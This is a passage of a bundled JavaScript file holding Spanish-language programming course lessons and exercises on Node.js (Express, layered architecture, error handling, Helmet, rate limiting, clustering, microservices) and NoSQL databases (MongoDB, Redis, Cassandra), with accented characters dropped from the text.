*   Cualquier otra ruta debe devolver un cdigo **404** y el texto "Ruta no encontrada".

**Resultado Esperado:** Un servidor que informa la hora actual dinmicamente segn la peticin.

---

## 2. API de Saludos Personalizados
**Objetivo:** Usar Express y parmetros de ruta (\`req.params\`).

**Consigna:**
Instala Express e implementa una ruta \`GET\` que:
*   Reciba un nombre como parmetro: \`/saludo/:nombre\`.
*   Responda con un JSON: \`{ "mensaje": "Hola [nombre]! Bienvenido al backend." }\`.
*   Si el nombre tiene menos de 3 letras, devuelve un status **400** con un mensaje de error.

**Resultado Esperado:** Una ruta que interacta con la URL y valida la entrada del usuario.

---

## 3. Mini Almacn de Frutas (CRUD en Memoria)
**Objetivo:** Implementar los mtodos GET y POST.

**Consigna:**
Crea una lista de frutas en un array: \`['Manzana', 'Pera']\`.
*   \`GET /frutas\`: Devuelve el array completo.
*   \`POST /frutas\`: Recibe una nueva fruta en el \`body\` y la agrega al array.
*   **Requisito:** Debes usar el middleware \`express.json()\` para que el POST funcione.

**Resultado Esperado:** Poder listar y "guardar" elementos mientras el servidor est encendido.

---

## 4. El "Guardia de Seguridad" (Middlewares)
**Objetivo:** Entender el flujo de los middlewares.

**Consigna:**
Crea un servidor con Express y define un middleware global que:
*   Imprima en consola el mtodo (GET, POST, etc) y la URL de cada peticin.
*   Crea una ruta \`/secreto\` que solo responda si el usuario enva un query param \`password=1234\`.
*   Si el password es incorrecto o no est, corta la peticin y devuelve un **401 (No autorizado)**.

**Resultado Esperado:** Un sistema que registra actividad en consola y protege rutas especficas.

---

## 5. Buscador de Libros con Errores Controlados
**Objetivo:** Integrar lgica de bsqueda y manejo de estados HTTP.

**Consigna:**
Crea un array de objetos \`libros\` (id, titulo, autor).
*   \`GET /libros/:id\`: Busca el libro.
*   Si el libro existe, devulvelo en formato JSON.
*   Si el libro **no existe**, no dejes que la app explote; devuelve un status **404** con un mensaje descriptivo: "Lo sentimos, el libro con ID [id] no est en nuestra biblioteca".

**Resultado Esperado:** Una API robusta que maneja casos de error de forma profesional.

---

A programar! El backend es el cimiento de toda gran aplicacin. 
`,completed:!1,isProject:!0},{id:"node-junior-evaluacion",title:"Evaluacin Node.js Junior",level:"junior",content:'# Evaluacin Final: Node.js Junior\n\nDemuestra que dominas los fundamentos de Node.js, Express y la gestin de paquetes.\n\n## 1. Examen Terico\n*   Qu significa que Node.js sea de "hilo nico" (single-threaded)?\n*   Para qu sirve el archivo `package-lock.json` y por qu es importante no borrarlo?\n*   Explica la diferencia entre `res.send()` y `res.json()`.\n\n## 2. Desafo Prctico: Servidor de Noticias\nCrea un servidor con Express que:\n1. Tenga un array de objetos `noticias` con: `id`, `titulo` y `contenido`.\n2. Implemente una ruta `GET /noticias` para ver todas.\n3. Implemente una ruta `GET /noticias/:id` que devuelva una noticia especfica.\n4. Si el `id` no existe, debe responder con status 404 y un JSON: `{ "error": "Noticia no encontrada" }`.\n\n## 3. Ejercicio de Paquetes y Mdulos\n1. Crea un mdulo llamado `utils.js` que exporte una funcin para formatear fechas.\n2. Instala la librera `moment` o `date-fns` y sala dentro de ese mdulo.\n3. Importa la funcin en tu servidor y sala para agregar una propiedad `fecha_peticion` a cada respuesta de noticias.\n\n## 4. Criterios de Aprobacin\n* [ ] El servidor inicia sin errores con `node server.js`.\n* [ ] Uso correcto de parmetros dinmicos (`req.params`).\n* [ ] Manejo adecuado de cdigos de estado HTTP (200, 404).\n* [ ] El proyecto tiene un `package.json` vlido con sus dependencias.\n',completed:!1,isProject:!0},{id:"node-semi-senior-arquitectura-profesional",title:"Arquitectura y Estructura Profesional",level:"semi-senior",content:`# Leccin 12: Arquitectura y Estructura Profesional

En el nivel Junior, un solo archivo \`index.js\` basta. En el nivel Semi-Senior, construimos sistemas. La meta es que tu cdigo sea **mantenible**, **testeable** y **escalable**.

## 1. El Gran Error: El "Fat Controller"
Un error comn es poner toda la lgica (validacin, base de datos, respuesta) dentro de la ruta.
\`\`\`javascript
//  INCORRECTO: Todo mezclado
app.get('/users', async (req, res) => {
  const data = await db.query('...'); // Acceso a datos
  const filtered = data.filter(...);  // Lgica de negocio
  res.json(filtered);                 // Respuesta
});
\`\`\`

## 2. El Patrn de Capas (Proper Layering)
Dividimos la responsabilidad en 3 capas principales:
1.  **Rutas (Router):** Solo definen los puntos de entrada. 
2.  **Controladores (Controllers):** Orquestan la peticin. No saben de base de datos, llaman a los servicios.
3.  **Servicios (Services):** Aqu vive la "Lgica de Negocio". Consultas a DB, clculos complejos, llamadas a APIs externas.

## 3. Estructura de Carpetas Recomendada
\`\`\`
src/
  app.js            # Configuracin de Express
  server.js         # Punto de entrada (listen)
  routes/           # Definicin de endpoints
  controllers/      # Lgica de orquestacin
  services/         # Lgica de negocio y DB
  middlewares/      # Funciones intermedias
  config/           # Variables de entorno y constantes
  utils/            # Funciones de ayuda
\`\`\`

## 4. Comparativa: Cdigo Sucio vs Cdigo Profesional
**Profesional (Separado):**
\`\`\`javascript
// routes/userRoutes.js
router.get('/', userController.getAll);

// controllers/userController.js
exports.getAll = async (req, res) => {
  const users = await userService.fetchActiveUsers();
  res.json(users);
};
\`\`\`

---

## Mini Ejercicio
Refactoriza un endpoint que tengas creado. Mueve la lgica de la funcin a un archivo llamado \`userController.js\` y exprtala.
`,completed:!1},{id:"node-semi-senior-async-errores",title:"Asincrona y Manejo de Errores Avanzado",level:"semi-senior",content:`# Leccin 13: Asincrona y Manejo de Errores Avanzado

En el backend, el 90% de lo que haces es asncrono. Manejar los errores correctamente es lo que separa a un senior de un junior.

## 1. Adis a los Callbacks y al \`.then()\`
Usamos \`async/await\` porque hace que el cdigo asncrono parezca sncrono y sea mucho ms fcil de leer. Sin embargo, no olvides el \`try/catch\`.

## 2. El "Try/Catch" Global
En lugar de envolver cada ruta en un \`try/catch\` individual (lo cual ensucia el cdigo), usamos un **Wrapper** o un middleware de error global.

\`\`\`javascript
//  CORRECTO: Un patrn de "catchErrors"
const catchErrors = (fn) => (req, res, next) => {
  return fn(req, res, next).catch(next);
};

app.get('/users', catchErrors(async (req, res) => {
  const users = await db.getUsers(); // Si esto falla, va directo al middleware de error
  res.json(users);
}));
\`\`\`

## 3. Middleware de Error Centralizado
Debes tener un lugar donde todos los errores terminen. Esto te permite loguearlos y responder siempre con el mismo formato.

\`\`\`javascript
app.use((err, req, res, next) => {
  const status = err.statusCode || 500;
  res.status(status).json({
    status: 'error',
    message: err.message || 'Error interno del servidor'
  });
});
\`\`\`

## 4. Clases de Error Personalizadas
Crea tus propios tipos de errores para ser ms especfico.

\`\`\`javascript
class AppError extends Error {
  constructor(message, statusCode) {
    super(message);
    this.statusCode = statusCode;
  }
}
// Uso: throw new AppError('Usuario no encontrado', 404);
\`\`\`

---

## Mini Ejercicio
Crea una funcin asncrona que simule una falla (usa \`Promise.reject\`). Luego, intenta capturar ese error usando el patrn \`try/catch\` y registra el error en la consola.
`,completed:!1},{id:"node-semi-senior-seguridad-env",title:"Seguridad y Variables de Entorno",level:"semi-senior",content:"# Leccin 14: Seguridad y Variables de Entorno\n\nUn backend expuesto a internet es un blanco constante. No proteger tus llaves o tu servidor es una negligencia profesional.\n\n## 1. El Peligro del `.env` en Git\n**Nunca, bajo ninguna circunstancia**, subas tu archivo `.env` al repositorio. \n*   **Caso Real:** Un desarrollador subi sus claves de AWS a GitHub. En 5 minutos, un bot las rob y min criptomonedas por valor de $5,000 USD.\n*   **Solucin:** Crea un `.env.example` con las llaves vacas para que otros sepan qu configurar, pero ignora el `.env` real en `.gitignore`.\n\n## 2. Helmet.js: Seguridad por defecto\nExpress viene con algunas cabeceras HTTP que revelan demasiado (como `X-Powered-By: Express`). `Helmet` las oculta y agrega capas de proteccin extra automticamente.\n```bash\nnpm install helmet\n```\n```javascript\nconst helmet = require('helmet');\napp.use(helmet());\n```\n\n## 3. Limitacin de Peticiones (Rate Limiting)\nEvita que un bot bombardee tu servidor con miles de peticiones para tirarlo (Ataque DoS).\n```javascript\nconst rateLimit = require('express-rate-limit');\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutos\n  max: 100 // Lmite de 100 peticiones por IP\n});\napp.use(limiter);\n```\n\n## 4. CORS (Cross-Origin Resource Sharing)\nSi tu frontend est en un dominio y tu backend en otro, necesitas configurar CORS para que el navegador permita la comunicacin. S especfico, no uses `*` en produccin.\n\n---\n\n## Mini Ejercicio\nInstala `dotenv` y crea un archivo `.env` con un `PORT=4000`. Modifica tu servidor para que lea esa variable usando `process.env.PORT`.\n",completed:!1},{id:"node-semi-senior-validaciones-logging",title:"Validaciones y Logging Profesional",level:"semi-senior",content:`# Leccin 15: Validaciones y Logging Profesional

En una API profesional, no dejas que cualquier dato entre a tu sistema, y no vuelas a ciegas si algo falla.

## 1. Validando Entradas con Joi o Zod
No valides manualmente cada campo con \`if (req.body.name === '')\`. Usa esquemas de validacin.
\`\`\`javascript
//  Ejemplo con Zod
const userSchema = z.object({
  email: z.string().email(),
  age: z.number().min(18)
});

// Middleware de validacin
const validate = (schema) => (req, res, next) => {
  const result = schema.safeParse(req.body);
  if (!result.success) return res.status(400).json(result.error);
  next();
};
\`\`\`

## 2. No uses \`console.log\` en produccin
Los \`console.log\` son pesados, no se pueden apagar fcilmente y no guardan estructura. Usa un Logger profesional como **Winston** o **Pino**.
*   Permiten guardar logs en archivos.
*   Tienen niveles: \`info\`, \`warn\`, \`error\`, \`debug\`.
*   En produccin, puedes silenciar los \`debug\` para no llenar el disco duro.

## 3. Ejemplo de Logging Estructurado
\`\`\`javascript
logger.info('Pago procesado con xito', { orderId: 123, amount: 50.0 });
logger.error('Fallo en conexin con DB', { error: err.message });
\`\`\`

---

## Desafo Semi-Senior Final
Crea una API que:
1.  Tenga una estructura de carpetas profesional.
2.  Use \`dotenv\` para el puerto.
3.  Implemente un middleware de validacin para una ruta \`POST\`.
4.  Tenga un middleware de error global que responda en formato JSON.

A darle tomos! Has subido de nivel. 
`,completed:!1},{id:"node-semi-senior-evaluacion",title:"Evaluacin Node.js Semi-Senior",level:"semi-senior",content:'# Evaluacin Final: Node.js Semi-Senior\n\nEsta evaluacin pone a prueba tu capacidad para estructurar aplicaciones profesionales, manejar asincrona y asegurar el entorno.\n\n## 1. Examen Terico\n*   Qu es la "Lgica de Negocio" y en qu capa de una arquitectura profesional debera vivir?\n*   Explica el patrn "Wrapper" para el manejo de errores en rutas asncronas de Express.\n*   Cules son los riesgos de seguridad vinculados a CORS y cmo configurarlos correctamente en produccin?\n\n## 2. Desafo Prctico: Refactorizacin Profesional\nSe te entrega una API que tiene toda la lgica en un solo archivo `index.js`.\n1. Crea una estructura de carpetas: `routes`, `controllers`, `services`.\n2. Mueve la lgica de una ruta complexa (ej: Buscar productos con filtros) siguiendo el patrn de capas.\n3. Asegrate de usar `async/await` con un manejo de errores centralizado (middleware).\n\n## 3. Seguridad y Configuracin\n1. Configura `dotenv` para manejar el puerto y una clave secreta ficticia `JWT_SECRET`.\n2. Implementa un middleware de validacin usando `Zod` o `Joi` para una ruta de registro que pida: `email` (vlido), `password` (mn 8 carac.) y `rol` (admin o user).\n\n## 4. Logging\n1. Instala `winston` o simula un logger que guarde en un archivo `errors.log` solo cuando ocurra un error de status 500.\n\n## 5. Criterios de Aprobacin\n* [ ] Arquitectura claramente separada (decoplamiento).\n* [ ] Validacin de datos de entrada robusta.\n* [ ] No se exponen secretos en el cdigo (uso de .env).\n* [ ] El sistema siempre responde en JSON, incluso en caso de error.\n',completed:!1,isProject:!0},{id:"node-senior-clean-architecture",title:"Clean Architecture en Node.js",level:"senior",content:`# Leccin 16: Clean Architecture en Node.js

A nivel Senior, el cdigo no se organiza por "libreras" (Express, Mongoose), sino por **dominio de negocio**. La infraestructura es un detalle.

## 1. La Regla de Dependencia
En Clean Architecture, las dependencias solo pueden apuntar **hacia adentro**.
*   **Entidades (Ncleo):** Reglas de negocio puras (ej: un Usuario, un Pedido).
*   **Casos de Uso:** Orquestan el flujo de datos (ej: \`CrearPedido\`, \`CancelarSuscripcion\`).
*   **Adaptadores (Interface Adapters):** Convierten datos entre el ncleo y el mundo exterior (Controllers, Repositorios).
*   **Frameworks y Drivers (Externo):** Express, MongoDB, APIs externas.

## 2. Inyeccin de Dependencias (DI)
Un arquitecto Senior nunca hace \`const db = require('./database')\` dentro de su lgica de negocio.
**Por qu?** Porque eso acopla tu lgica a esa base de datos especfica.

\`\`\`javascript
//  CORRECTO: El servicio recibe sus dependencias
class UserService {
  constructor(userRepository) {
    this.userRepository = userRepository;
  }
  
  async getUser(id) {
    return this.userRepository.findById(id);
  }
}
\`\`\`

## 3. Ventaja: Testeabilidad
Si tu lgica no depende de archivos fsicos sino de interfaces, puedes pasarle un "Mock" en tus tests y probar el 100% de tu cdigo sin haber instalado una base de datos real.

---

## Pregunta de Entrevista Senior
**P:** "Cul es la diferencia entre un Repositorio y un DAO (Data Access Object)?"
**R:** El DAO es un mapeo de la tabla de la DB. El Repositorio es una abstraccin de coleccin del dominio. Un Senior usa Repositorios para que la lgica de negocio no sepa si los datos vienen de SQL, NoSQL o un archivo CSV.
`,completed:!1},{id:"node-senior-escalabilidad",title:"Escalabilidad Horizontal y el Cluster Module",level:"senior",content:`# Leccin 17: Escalabilidad Horizontal y el Cluster Module

Node.js corre en un solo hilo. Si tu servidor tiene 16 ncleos de CPU, Node por defecto solo usar uno, desperdiciando el 94% de tu potencia.

## 1. Escalabilidad Vertical vs Horizontal
*   **Vertical:** Comprar una PC ms potente (Tiene un lmite fsico y econmico).
*   **Horizontal:** Aadir ms instancias de tu servidor (Infinito).

## 2. El Mdulo \`cluster\`
Permite crear copias de tu servidor (Workers) que comparten el mismo puerto.
\`\`\`javascript
const cluster = require('cluster');
const http = require('http');
const numCPUs = require('os').cpus().length;

if (cluster.isMaster) {
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork(); // Crea un worker por cada ncleo
  }
} else {
  // Aqu corre tu servidor Express normal
  http.createServer((req, res) => { ... }).listen(8000);
}
\`\`\`

## 3. Estado en Memoria (El enemigo)
En una arquitectura escalada horizontalmente, **NUNCA** guardes datos en variables (\`let users = []\`).
Si un usuario se loguea en el Worker 1 y su siguiente peticin llega al Worker 2, para el servidor ese usuario no existe.
*   **Solucin:** Usa una sesin centralizada en **Redis**.

## 4. PM2: El estndar en produccin
En lugar de manejar el cluster a mano, usamos PM2:
\`pm2 start app.js -i max\`
Esto levanta automticamente el nmero mximo de instancias segn los ncleos de tu servidor y los reinicia si fallan.

---

## Desafo Tcnico
Investiga qu es el "Sticky Session" y por qu es un antipatrn en la mayora de los casos modernos (Stateless APIs).
`,completed:!1},{id:"node-senior-performance-profiling",title:"Performance, Profiling y Memory Leaks",level:"senior",content:`# Leccin 18: Performance, Profiling y Memory Leaks

Un desarrollador Senior es un detective de la performance. No optimiza por sospecha, optimiza por **evidencia**.

## 1. El Costo del Event Loop
Si el Event Loop se retrasa ms de 50ms, la experiencia del usuario se degrada.
*   **Herramienta:** \`clinic.js\` para visualizar cuellos de botella.
*   **Causa comn:** Operaciones con JSON gigantes o encriptacin pesada en el hilo principal.

## 2. Memory Leaks (Fugas de Memoria)
Ocurre cuando guardas datos en variables globales y nunca los limpias. Eventualmente, el recolector de basura (V8 Garbage Collector) no puede limpiar la RAM y el servidor explota con un \`Out of Memory\`.
*   **Profiling:** Usa \`--inspect\` de Node para conectar las Chrome DevTools a tu servidor y ver el Heap Snapshot.

## 3. Streams: La clave para datos grandes
**Caso Real:** Tienes que enviar un archivo de 2GB al usuario.
*   **Junior:** \`fs.readFile()\` (Carga 2GB en RAM, explota el servidor).
*   **Senior:** \`fs.createReadStream()\` (Enva pedazos de 64KB de disco a red sin tocar la RAM).

## 4. Worker Threads
Para tareas de CPU pesadas (criptografa, procesamiento de imgenes), Node permite usar hilos reales adicionales con el mdulo \`worker_threads\`.

---

## Pregunta Senior
"Cmo manejaras una API que recibe 100,000 registros por segundo?"
**R:** No los escribira a la DB directamente. Usara un sistema de mensajera (RabbitMQ, Kafka) como buffer para que el backend los procese a su propio ritmo sin saturar la base de datos (Backpressure).
`,completed:!1},{id:"node-senior-microservicios",title:"Microservicios y API Gateways",level:"senior",content:`# Leccin 19: Microservicios y API Gateways

Cuando una aplicacin crece demasiado (Monolito), se vuelve lenta de desplegar y arriesgada de modificar. Pasamos a **Microservicios**.

## 1. El concepto
Cada funcionalidad vive en su propio servidor independiente (Node, Go, Python).
*   Ventaja: Si falla el servicio de "Notificaciones", el servicio de "Pagos" sigue funcionando.

## 2. Comunicacin entre servicios
*   **Sincrnica (HTTP/gRPC):** El servicio A llama al B y espera respuesta. (Fcil, pero crea acoplamiento).
*   **Asincrnica (Event-Driven):** El servicio A publica un evento ("PagoRealizado") en un Bus (Redis, RabbitMQ) y el servicio B lo escucha cuando puede.

## 3. API Gateway
No queremos que el frontend sepa las 20 URLs de nuestros microservicios. Ponemos una cara visible (Gateway) que recibe todo y lo redirige internamente. Adems, el Gateway maneja la **autenticacin centralizada**.

## 4. El "Distributed Tracing"
Si una peticin pasa por 5 servicios y falla en el cuarto, cmo lo rastreas?
*   **Solucin:** \`Correlation IDs\`. Un ID nico que viaja en los headers de todas las llamadas entre servicios.

---

## Desafo Senior
Disea un sistema donde el servicio de \`Usuarios\` debe informar al servicio de \`Email\` que enve un correo de bienvenida. Usaras HTTP o un Mensaje en una cola? Justifica tu respuesta basada en la tolerancia a fallos.
`,completed:!1},{id:"node-senior-evaluacion",title:"Evaluacin Node.js Senior",level:"senior",content:`# Evaluacin Final: Node.js Senior

Demuestra tu capacidad para disear y diagnosticar sistemas de alta disponibilidad.

## 1. Diseo de Arquitectura (Escenario Real)
"Estamos construyendo un sistema de reserva de entradas para un concierto masivo (tipo Taylor Swift). Esperamos 1 milln de usuarios en el primer minuto."
1. Describe cmo evitaras el "Race Condition" (que dos personas compren el mismo asiento).
2. Cmo protegeras la base de datos de ser saturada?
3. Qu estrategia de cach usaras?

## 2. Diagnstico de Produccin
El equipo de monitoreo reporta que el uso de CPU de los servidores Node sube al 100% y se mantiene ah, pero el trfico no ha aumentado. 
1. Qu herramientas usaras para encontrar el problema?
2. Menciona 3 causas posibles de este comportamiento.

## 3. Seguridad Crtica
1. Un hacker est intentando un ataque de \`Replay Attack\` capturando tokens JWT vlidos. Cmo lo mitigaras sin invalidar todos los tokens del sistema?
2. Explica la diferencia entre \`Inyeccin NoSQL\` y \`SQL Injection\` en el contexto de Node.

## 4. Performance Profunda
Se tiene un array de 5 millones de objetos en memoria y se necesita realizar una bsqueda compleja que bloquea el Event Loop por 2 segundos. 
1. Propn una solucin usando \`Worker Threads\`.
2. Propn una solucin alternativa moviendo esa lgica fuera de Node.

## 5. Criterios de Aprobacin
* [ ] Capacidad de justificar decisiones tecnolgicas basadas en tradeoffs (ventajas/desventajas).
* [ ] Conocimiento profundo de las libreras de infraestructura (Redis, RabbitMQ, Docker).
* [ ] Enfoque preventivo ante fallos (observabilidad y resiliencia).
`,completed:!1,isProject:!0}]},cv={id:"nosql",title:"Bases de Datos NoSQL",description:"Domina los sistemas de datos no relacionales, la escalabilidad horizontal y el modelado flexible.",completed:!1,track:"Backend & Data",lessons:[{id:"nosql-01-fundamentos",title:"Fundamentos NoSQL",level:"junior",content:`# Leccin 1: Fundamentos NoSQL

NoSQL no significa "No SQL", sino "Not Only SQL". Es un cambio de paradigma para manejar datos a gran escala.

## 1. Qu es NoSQL?
Son bases de datos que no siguen el modelo relacional tradicional de tablas y filas predefinidas. Estn diseadas para ser flexibles y escalar masivamente.

## 2. SQL vs NoSQL: El Gran Duelo
| Caracterstica | SQL (Relacional) | NoSQL (No Relacional) |
| :--- | :--- | :--- |
| **Esquema** | Rgido (Tablas fijas) | Flexible (Sin esquema o dinmico) |
| **Escalabilidad** | Vertical (Ms potente) | Horizontal (Ms mquinas) |
| **Relaciones** | Complejas (JOINs) | Desnormalizado (Documentos) |
| **Ideal para** | Datos estructurados, transacciones financieras | Datos masivos, redes sociales, logs, tiempo real |

## 3. Escalabilidad Horizontal (Sharding)
*   **SQL:** Si te quedas sin espacio, compras un servidor ms grande (ms RAM/CPU). Tiene un lmite fsico.
*   **NoSQL:** Si te quedas sin espacio, agregas 10 servidores baratos ms. La base de datos reparte los datos entre todos. Esto es el **Sharding**.

## 4. Cundo usar cada uno
*   **Usa SQL si:** Los datos son muy estructurados y las relaciones son vitales (ej: Un banco).
*   **Usa NoSQL si:** No sabes exactamente qu datos guardars, necesitas velocidad extrema de escritura, o los datos crecen sin control.

---

### Misin Junior:
Investiga el concepto de "Teorema CAP". Explica por qu una base de datos distribuida solo puede garantizar 2 de estas 3 cosas al mismo tiempo: Consistencia, Disponibilidad y Tolerancia a Particiones.
`,completed:!1},{id:"nosql-02-tipos",title:"Tipos de Bases NoSQL",level:"junior",content:`# Leccin 2: Tipos de Bases NoSQL

No todas las NoSQL son iguales. Se dividen segn cmo guardan los datos.

## 1. Documentales (MongoDB, CouchDB)
Guardan los datos en documentos (JSON o BSON). Es el tipo ms popular.
*   **Uso:** Perfiles de usuario, Catlogos de productos, CMS.
*   *Ventaja:* Los datos que se usan juntos, se guardan juntos.

## 2. Key-Value (Redis, DynamoDB bsico)
Es como un diccionario gigante de programacin (\`{clave: valor}\`).
*   **Uso:** Sesiones de usuario, Cach, Carrito de compras.
*   *Ventaja:* Velocidad de lectura/escritura en milisegundos.

## 3. Columnar (Cassandra, HBase)
Optimizadas para leer columnas especficas en billones de registros.
*   **Uso:** Analytics, logs histricos, series temporales.
*   *Ventaja:* Muy eficiente para Big Data.

## 4. Grafos (Neo4j, Amazon Neptune)
Se centran en las **relaciones** entre los datos.
*   **Uso:** Redes sociales (quin es amigo de quin), Sistemas de recomendacin, Deteccin de fraude.
*   *Ventaja:* Consultar conexiones complejas es instantneo.

---

### Misin Junior:
Imagina que ests construyendo Twitter. Qu tipo de base de datos usaras para los Tweets y cul para el sistema de "Seguir a otros usuarios"? Justifica tu respuesta.
`,completed:!1},{id:"nosql-03-mongodb-basico",title:"MongoDB Bsico (CRUD)",level:"junior",content:`# Leccin 3: MongoDB Bsico (El Rey de los Documentos)

Es la base NoSQL ms usada en el mundo. Vamos a ensuciarnos las manos.

## 1. Conceptos Clave
*   **Database:** El contenedor (igual que en SQL).
*   **Collection:** Equivalente a una tabla.
*   **Document:** Equivalente a una fila (un objeto JSON).
*   **BSON:** "Binary JSON". Es el formato interno de Mongo, ms rpido y soporta ms tipos de datos que el JSON comn.

## 2. CRUD: Los Comandos Esenciales

### Insert (Crear)
\`\`\`javascript
db.users.insertOne({
  name: "Octavio",
  age: 28,
  skills: ["JavaScript", "Cloud"]
})
\`\`\`

### Find (Leer)
\`\`\`javascript
// Buscar todos
db.users.find()

// Buscar con filtro
db.users.find({ age: { $gt: 18 } }) // Usuarios mayores de 18
\`\`\`

### Update (Actualizar)
\`\`\`javascript
db.users.updateOne(
  { name: "Octavio" },
  { $set: { age: 29 } }
)
\`\`\`

### Delete (Borrar)
\`\`\`javascript
db.users.deleteOne({ name: "Octavio" })
\`\`\`

---

### Misin Junior:
Instala **MongoDB Compass** (el cliente visual) o usa **MongoDB Atlas** (en la nube gratis).
1. Crea una coleccin llamada \`books\`.
2. Inserta 3 libros con campos distintos (algunos con autor, otros con tags, otros con reviews). Mira cmo Mongo no se queja!
3. Busca todos los libros cuyo "precio" sea menor a 50.
`,completed:!1},{id:"nosql-04-modelado",title:"Modelado NoSQL (Embedding vs Referencing)",level:"junior",content:`# Leccin 4: Modelado Bsico (Embedding vs Referencing)

En SQL normalizas. En NoSQL, modelas segn cmo vas a consultar la aplicacin.

## 1. Embedding (Embeber / Anidamiento)
Guardas los datos relacionados dentro del mismo documento.
\`\`\`json
{
  "order_id": 1,
  "user": "Octavio",
  "items": [
    { "product": "Monitor", "price": 200 },
    { "product": "Teclado", "price": 50 }
  ]
}
\`\`\`
*   **Cundo usar:** Relaciones 1:1 o 1:pocos. Los datos son pequeos y cambian poco.

## 2. Referencing (Referencia / El "JOIN" manual)
Guardas el ID del otro documento.
\`\`\`json
// Coleccin Orders
{
  "order_id": 1,
  "user_id": "ABC-123"
}
\`\`\`
*   **Cundo usar:** Relaciones 1:Muchos (miles) o Muchos:Muchos. Los datos crecen mucho o se usan en muchas partes.

## 3. Buenas Prcticas
*   **Regla de Oro:** "Los datos que se acceden juntos, deben estar juntos".
*   Evita anidar ms de 2 o 3 niveles.
*   No dejes que los documentos superen los 16MB (lmite de Mongo).

---

### Misin Junior:
Si ests modelando un Blog:
1. Los "comentarios" deberan estar dentro del documento del "Post" (Embedding) o en otra coleccin (Referencing)?
2. Qu pasa si el post tiene 10,000 comentarios? Investiga por qu el Embedding podra fallar en este caso.
`,completed:!1},{id:"nosql-05-proyecto-final",title:"Proyecto Final Junior NoSQL",level:"junior",content:`# Proyecto Final Nivel Junior: "Mi Primer Catlogo NoSQL"

Vamos a conectar Node.js con MongoDB para crear una API real.

## Objetivo
Crear un sistema de gestin de "Videojuegos" usando MongoDB como base de datos y Mongoose (el ODM de Node.js).

## Tareas Tcnico-Prcticas
1.  **Atlas:** Crea un cluster gratuito en MongoDB Atlas.
2.  **Node.js:** Inicializa un proyecto con \`npm init -y\` e instala \`mongoose\` y \`express\`.
3.  **Schema:** Define un esquema para \`Game\`:
    *   \`title\`: String (requerido).
    *   \`platform\`: String.
    *   \`genres\`: Array de Strings.
    *   \`rating\`: Number.
4.  **Endpoints:**
    *   \`POST /games\`: Para insertar un juego.
    *   \`GET /games\`: Para listar todos.
    *   \`GET /games?genre=RPG\`: Para filtrar por gnero.
    *   \`DELETE /games/:id\`: Para borrar.

## Entregable (Checklist)
*   [ ] El cdigo se conecta correctamente a la URI de Atlas.
*   [ ] Puedo insertar un juego sin definir todos los campos (flexibilidad).
*   [ ] He probado los endpoints con Postman o Thunder Client.
*   [ ] Explico en el README por qu eleg MongoDB para este catlogo en lugar de SQL.

Felicidades! Acabas de construir tu primer servicio con persistencia no relacional.
`,completed:!1},{id:"nosql-06-mongodb-intermedio",title:"MongoDB Intermedio (Agregacin)",level:"semi-senior",content:`# Leccin 6: MongoDB Intermedio (ndices y Agregacin)

Cuando tu base de datos crece de 1,000 a 1,000,000 de documentos, el rendimiento se vuelve crtico.

## 1. ndices: El mapa del tesoro
Sin ndices, MongoDB hace un **Collection Scan** (revisa cada documento). Con ndices, usa una estructura B-tree para saltar directamente al dato.
*   **Crear ndice:** \`db.users.createIndex({ email: 1 })\`
*   **ndices Compuestos:** \`db.orders.createIndex({ user_id: 1, date: -1 })\`
*   **Explain Plan:** Usa \`.explain("executionStats")\` para ver si tu consulta est usando el ndice o escaneando toda la coleccin.

## 2. Aggregation Pipeline
Es el "procesador de alimentos" de MongoDB. Permite transformar y calcular datos en etapas.
*   **$match:** Filtra documentos (como \`WHERE\`).
*   **$group:** Agrupa datos y calcula totales (como \`GROUP BY\`).
*   **$project:** Selecciona o renombra campos.
*   **$lookup:** El "Join" de MongoDB para unir colecciones.

### Ejemplo de Aggregation:
\`\`\`javascript
db.orders.aggregate([
  { $match: { status: "completed" } },
  { $group: { _id: "$customer_id", total: { $sum: "$amount" } } },
  { $sort: { total: -1 } }
])
\`\`\`

## 3. Performance Tuning
*   **Covered Queries:** Cuando el ndice contiene todos los campos que pides, Mongo ni siquiera lee el documento del disco.
*   **Proyeccin:** Pide solo los campos que necesitas \`find({}, { name: 1 })\`.

---

### Misin Semi-Senior:
Crea un Pipeline de agregacin que:
1. Una la coleccin \`users\` con \`orders\` usando \`$lookup\`.
2. Filtre solo los usuarios activos.
3. Calcule el promedio de gasto por usuario.
4. Exporta el resultado a una nueva coleccin usando \`$out\`.
`,completed:!1},{id:"nosql-07-redis",title:"Redis Cache",level:"semi-senior",content:`# Leccin 7: Redis (Cach y Alta Velocidad)

Redis no reemplaza a tu base de datos, la acelera.

## 1. Qu es Redis?
Es una base de datos en memoria (RAM). Es extremadamente rpida porque no escribe en disco para responder una consulta.

## 2. Casos de Uso Reales
*   **Cach de Sesiones:** Guardar el estado del login del usuario.
*   **Cach de Base de Datos:** Guardar el resultado de una query lenta de SQL/Mongo durante 5 minutos.
*   **Contadores en tiempo real:** "Likes" en un streaming masivo.
*   **Pub/Sub:** Sistema de mensajera instantnea.

## 3. Comandos y TTL (Time To Live)
El TTL es vital para que la memoria no explote.
*   \`SET user:123 "Octavio" EX 3600\` -> Guarda el valor y lo borra automticamente en 1 hora.
*   \`GET user:123\` -> Recupera el valor.
*   \`INCR view_count\` -> Incrementa un nmero de forma atmica.

## 4. Estrategias de Cach
*   **Cache-Aside:** La App busca en Redis. Si no est (Cache Miss), busca en DB, guarda en Redis y responde.
*   **Write-Through:** La App escribe en Redis y Redis escribe en DB.

---

### Misin Semi-Senior:
Implementa un middleware en Express que:
1. Revise si una ruta (ej: \`/products\`) est en Redis.
2. Si est, devuelva el JSON inmediatamente.
3. Si no, consulte a Mongo, guarde el resultado en Redis por 60 segundos y responda.
Mide la diferencia de tiempo entre el primer y el segundo request.
`,completed:!1},{id:"nosql-08-cassandra",title:"Cassandra Columnar",level:"semi-senior",content:`# Leccin 8: Cassandra (Escalabilidad Masiva)

Cuando MongoDB no es suficiente, entra Cassandra.

## 1. El modelo Columnar (Wide Column)
Cassandra no guarda documentos JSON, guarda filas con columnas dinmicas agrupadas por una **Partition Key**. Est diseada para escrituras masivas (millones por segundo).

## 2. Arquitectura Peer-to-Peer
A diferencia de Mongo (Master-Slave), en Cassandra todos los nodos son iguales. No hay un punto nico de falla.
*   **Replication Factor:** Cuntas copias de cada dato hay en el cluster.
*   **Consistency Level:** Cuntos nodos deben confirmar que el dato se guard para dar la operacin por exitosa? (ONE, QUORUM, ALL).

## 3. Particionamiento: El secreto de la escala
Los datos se distribuyen segn el hash de la Partition Key.
